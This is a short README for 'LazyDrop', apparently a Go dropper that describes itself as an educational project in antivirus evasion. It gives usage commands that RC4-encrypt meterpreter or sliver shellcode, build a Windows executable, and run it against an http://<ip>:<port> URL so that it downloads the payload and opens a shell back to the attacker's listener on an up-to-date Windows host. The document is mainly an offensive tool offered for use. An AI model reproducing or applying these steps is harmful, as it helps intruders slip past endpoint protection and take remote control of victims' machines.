# LazyDrop

This project is educational project for learning basic evasion techiniques. It serves the purpose to peacefully run your meterpreter/sliver payload in Updated Windows host, for now?

## Usage

Generate your payload in `shellcode` format. The following will output a file called `hello.rc4` which is rc4 encrypted shellcode, which our dropper will be downloaded using http

```bash
cd LazyDrop
go run ./cmd/obfuscate <your shellcode>
```

Complie the dropper, run it with the url of `hello.rc4` after transferring it to windows host

```
GOOS=windows GOARCH=amd64 go build -o dropper.exe ./cmd/dropper/main.go
# transfer it to windows host
dropper.exe http://<ip>:<port>/hello.rc4
```

Then you will get a shell back to your listener.

## Bugs

To work on windows11 host, you need to compile the program on windows 11
